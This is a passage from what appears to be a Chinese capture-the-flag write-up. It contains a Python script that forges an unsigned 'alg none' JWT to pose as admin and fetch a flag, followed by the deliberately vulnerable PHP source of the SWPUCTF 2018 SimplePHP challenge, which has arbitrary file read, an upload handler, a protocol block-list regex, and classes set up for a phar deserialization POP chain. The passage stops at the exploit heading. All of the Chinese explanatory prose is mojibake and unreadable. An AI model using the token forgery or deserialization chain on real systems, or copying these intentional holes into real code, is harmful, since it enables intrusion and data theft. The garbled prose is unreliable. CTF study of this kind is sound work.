<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">jwt</span>
</span></span><span class="line"><span class="cl"><span class="n">token</span> <span class="o">=</span> <span class="n">jwt</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;secretid&#34;</span><span class="p">:</span> <span class="p">[],</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;username&#34;</span><span class="p">:</span> <span class="s2">&#34;admin&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;password&#34;</span><span class="p">:</span> <span class="s2">&#34;123456&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;iat&#34;</span><span class="p">:</span> <span class="mi">1742471740</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="n">algorithm</span><span class="o">=</span><span class="s2">&#34;none&#34;</span><span class="p">,</span> <span class="n">key</span><span class="o">=</span><span class="s2">&#34;&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="n">encoding</span><span class="o">=</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">token</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>bp‰øÆÊîπÊîæÂåÖÁÑ∂ÂêéËÆøÈóÆ/api/flag</p>
<h2 id="swpuctf-2018simplephp">[SWPUCTF 2018]SimplePHP
</h2><p>Êü•ÁúãÊ∫êÁ†Å</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250320204558124.png"
	width="1190"
	height="325"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250320204558124_hu11887701612488520385.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250320204558124_hu12881395714476106575.png 1024w"
	loading="lazy"
	
		alt="image-20250320204558124"
	
	
		class="gallery-image" 
		data-flex-grow="366"
		data-flex-basis="878px"
	
></p>
<p>Êü•ÁúãÊñá‰ª∂ËøôÈáåÊúâ‰ªªÊÑèÊñá‰ª∂ËØªÂèñ</p>
<p>index.php</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> 
</span></span><span class="line"><span class="cl"><span class="nx">header</span><span class="p">(</span><span class="s2">&#34;content-type:text/html;charset=utf-8&#34;</span><span class="p">);</span>  
</span></span><span class="line"><span class="cl"><span class="k">include</span> <span class="s1">&#39;base.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err"> 
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>base.php</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> 
</span></span><span class="line"><span class="cl">    <span class="nx">session_start</span><span class="p">();</span> 
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err"> 
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;!DOCTYPE html&gt; 
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;html&gt; 
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;head&gt; 
</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;meta charset=&#34;utf-8&#34;&gt; 
</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;title&gt;web3&lt;/title&gt; 
</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;link rel=&#34;stylesheet&#34; href=&#34;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/css/bootstrap.min.css&#34;&gt; 
</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;script src=&#34;https://cdn.staticfile.org/jquery/2.1.1/jquery.min.js&#34;&gt;&lt;/script&gt; 
</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;script src=&#34;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/js/bootstrap.min.js&#34;&gt;&lt;/script&gt; 
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;/head&gt; 
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;body&gt; 
</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;nav class=&#34;navbar navbar-default&#34; role=&#34;navigation&#34;&gt; 
</span></span></span><span class="line"><span class="cl"><span class="err">        &lt;div class=&#34;container-fluid&#34;&gt; 
</span></span></span><span class="line"><span class="cl"><span class="err">        &lt;div class=&#34;navbar-header&#34;&gt; 
</span></span></span><span class="line"><span class="cl"><span class="err">            &lt;a class=&#34;navbar-brand&#34; href=&#34;index.php&#34;&gt;È¶ñÈ°µ&lt;/a&gt; 
</span></span></span><span class="line"><span class="cl"><span class="err">        &lt;/div&gt; 
</span></span></span><span class="line"><span class="cl"><span class="err">            &lt;ul class=&#34;nav navbar-nav navbra-toggle&#34;&gt; 
</span></span></span><span class="line"><span class="cl"><span class="err">                &lt;li class=&#34;active&#34;&gt;&lt;a href=&#34;file.php?file=&#34;&gt;Êü•ÁúãÊñá‰ª∂&lt;/a&gt;&lt;/li&gt; 
</span></span></span><span class="line"><span class="cl"><span class="err">                &lt;li&gt;&lt;a href=&#34;upload_file.php&#34;&gt;‰∏ä‰º†Êñá‰ª∂&lt;/a&gt;&lt;/li&gt; 
</span></span></span><span class="line"><span class="cl"><span class="err">            &lt;/ul&gt; 
</span></span></span><span class="line"><span class="cl"><span class="err">            &lt;ul class=&#34;nav navbar-nav navbar-right&#34;&gt; 
</span></span></span><span class="line"><span class="cl"><span class="err">                &lt;li&gt;&lt;a href=&#34;index.php&#34;&gt;&lt;span class=&#34;glyphicon glyphicon-user&#34;&gt;&lt;/span&gt;&lt;?php echo $_SERVER[&#39;REMOTE_ADDR&#39;];?&gt;&lt;/a&gt;&lt;/li&gt; 
</span></span></span><span class="line"><span class="cl"><span class="err">            &lt;/ul&gt; 
</span></span></span><span class="line"><span class="cl"><span class="err">        &lt;/div&gt; 
</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;/nav&gt; 
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;/body&gt; 
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;/html&gt; 
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;!--flag is in f1ag.php--&gt;
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>file.php</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> 
</span></span><span class="line"><span class="cl"><span class="nx">header</span><span class="p">(</span><span class="s2">&#34;content-type:text/html;charset=utf-8&#34;</span><span class="p">);</span>  
</span></span><span class="line"><span class="cl"><span class="k">include</span> <span class="s1">&#39;function.php&#39;</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl"><span class="k">include</span> <span class="s1">&#39;class.php&#39;</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl"><span class="nx">ini_set</span><span class="p">(</span><span class="s1">&#39;open_basedir&#39;</span><span class="p">,</span><span class="s1">&#39;/var/www/html/&#39;</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl"><span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">]</span> <span class="o">?</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="s2">&#34;&#34;</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$file</span><span class="p">))</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&#34;</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl"><span class="p">}</span> 
</span></span><span class="line"><span class="cl"><span class="nv">$show</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Show</span><span class="p">();</span> 
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$file</span><span class="p">))</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">    <span class="nv">$show</span><span class="o">-&gt;</span><span class="na">source</span> <span class="o">=</span> <span class="nv">$file</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">    <span class="nv">$show</span><span class="o">-&gt;</span><span class="na">_show</span><span class="p">();</span> 
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$file</span><span class="p">)){</span> 
</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;file doesn\&#39;t exists.&#39;</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl"><span class="p">}</span> 
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err"> 
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>function.php</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> 
</span></span><span class="line"><span class="cl"><span class="c1">//show_source(__FILE__); 
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">include</span> <span class="s2">&#34;base.php&#34;</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl"><span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Content-type: text/html;charset=utf-8&#34;</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">upload_file_do</span><span class="p">()</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="nv">$_FILES</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">    <span class="nv">$filename</span> <span class="o">=</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;name&#34;</span><span class="p">]</span><span class="o">.</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&#34;REMOTE_ADDR&#34;</span><span class="p">])</span><span class="o">.</span><span class="s2">&#34;.jpg&#34;</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">    <span class="c1">//mkdir(&#34;upload&#34;,0777); 
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span><span class="p">(</span><span class="nx">file_exists</span><span class="p">(</span><span class="s2">&#34;upload/&#34;</span> <span class="o">.</span> <span class="nv">$filename</span><span class="p">))</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">        <span class="nx">unlink</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl">    <span class="p">}</span> 
</span></span><span class="line"><span class="cl">    <span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;tmp_name&#34;</span><span class="p">],</span><span class="s2">&#34;upload/&#34;</span> <span class="o">.</span> <span class="nv">$filename</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s1">&#39;&lt;script type=&#34;text/javascript&#34;&gt;alert(&#34;‰∏ä‰º†ÊàêÂäü!&#34;);&lt;/script&gt;&#39;</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl"><span class="p">}</span> 
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">upload_file</span><span class="p">()</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="nv">$_FILES</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">upload_file_check</span><span class="p">())</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">        <span class="nx">upload_file_do</span><span class="p">();</span> 
</span></span><span class="line"><span class="cl">    <span class="p">}</span> 
</span></span><span class="line"><span class="cl"><span class="p">}</span> 
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">upload_file_check</span><span class="p">()</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="nv">$_FILES</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">    <span class="nv">$allowed_types</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;gif&#34;</span><span class="p">,</span><span class="s2">&#34;jpeg&#34;</span><span class="p">,</span><span class="s2">&#34;jpg&#34;</span><span class="p">,</span><span class="s2">&#34;png&#34;</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl">    <span class="nv">$temp</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s2">&#34;.&#34;</span><span class="p">,</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;name&#34;</span><span class="p">]);</span> 
</span></span><span class="line"><span class="cl">    <span class="nv">$extension</span> <span class="o">=</span> <span class="nx">end</span><span class="p">(</span><span class="nv">$temp</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$extension</span><span class="p">))</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">        <span class="c1">//echo &#34;&lt;h4&gt;ËØ∑ÈÄâÊã©‰∏ä‰º†ÁöÑÊñá‰ª∂:&#34; . &#34;&lt;h4/&gt;&#34;; 
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span> 
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">{</span> 
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$extension</span><span class="p">,</span><span class="nv">$allowed_types</span><span class="p">))</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="k">true</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">        <span class="p">}</span> 
</span></span><span class="line"><span class="cl">        <span class="k">else</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s1">&#39;&lt;script type=&#34;text/javascript&#34;&gt;alert(&#34;Invalid file!&#34;);&lt;/script&gt;&#39;</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="k">false</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">        <span class="p">}</span> 
</span></span><span class="line"><span class="cl">    <span class="p">}</span> 
</span></span><span class="line"><span class="cl"><span class="p">}</span> 
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err"> 
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>class.php</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"> <span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">C1e4r</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$test</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$str</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$name</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">str</span> <span class="o">=</span> <span class="nv">$name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">test</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">str</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">test</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Show</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$source</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$str</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$file</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">source</span> <span class="o">=</span> <span class="nv">$file</span><span class="p">;</span>   <span class="c1">//$this-&gt;source = phar://phar.jpg
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">source</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__toString</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$content</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">str</span><span class="p">[</span><span class="s1">&#39;str&#39;</span><span class="p">]</span><span class="o">-&gt;</span><span class="na">source</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$content</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__set</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span><span class="nv">$value</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="nv">$key</span> <span class="o">=</span> <span class="nv">$value</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">_show</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/http|https|file:|gopher|dict|\.\.|f1ag/i&#39;</span><span class="p">,</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">source</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">die</span><span class="p">(</span><span class="s1">&#39;hacker!&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nx">highlight_file</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">source</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/http|https|file:|gopher|dict|\.\./i&#34;</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">source</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;hacker~&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">source</span> <span class="o">=</span> <span class="s2">&#34;index.php&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Test</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$file</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$params</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">params</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__get</span><span class="p">(</span><span class="nv">$key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="nv">$key</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">get</span><span class="p">(</span><span class="nv">$key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">params</span><span class="p">[</span><span class="nv">$key</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$value</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">params</span><span class="p">[</span><span class="nv">$key</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$value</span> <span class="o">=</span> <span class="s2">&#34;index.php&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file_get</span><span class="p">(</span><span class="nv">$value</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">file_get</span><span class="p">(</span><span class="nv">$value</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$text</span> <span class="o">=</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$value</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$text</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err"> 
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ÊâìpopÈìæÂä†pharÂèçÂ∫èÂàóÂåñ</p>
<p>ÂÖàÊâæÂà©Áî®ÁÇπ<code>Test</code>Á±ªÈáåÈù¢ÁöÑ<code>file_get</code>ÂáΩÊï∞ËÉΩËØªÂèñÊñá‰ª∂ÂÜÖÂÆπÔºåË¶ÅËß¶Âèë<code>__get</code>ÊñπÊ≥ïÔºåÊâæÂà∞<code>show</code>Á±ªÈáåÈù¢ÁöÑ<code>__toString</code>ÁÑ∂ÂêéÂú®<code>C1e4r</code>Á±ªÈáåÈù¢ÊúâechoËß¶Âèë</p>
<p>exp</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
